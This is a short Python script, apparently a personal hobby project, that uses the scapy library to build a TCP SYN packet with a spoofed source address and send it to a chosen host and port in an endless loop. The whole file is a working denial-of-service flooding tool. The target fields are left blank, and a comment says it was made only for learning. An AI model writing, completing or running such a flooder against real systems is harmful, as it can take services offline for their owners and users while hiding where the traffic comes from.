#!/usr/bin/python3

# Simple SYN flooder made using 'scapy' module.
# This project was created only for learning and will not be developed any more.
# Author: D1N3SHh


from scapy.all import *

target_host = ""
target_port = 80
fake_source_address = ""

syn_packet = (IP(src=fake_source_address, dst=target_host)/TCP(sport=6666, dport=target_port))

print("[*] Starting sending packages...")
while True:
    send(syn_packet, verbose=False)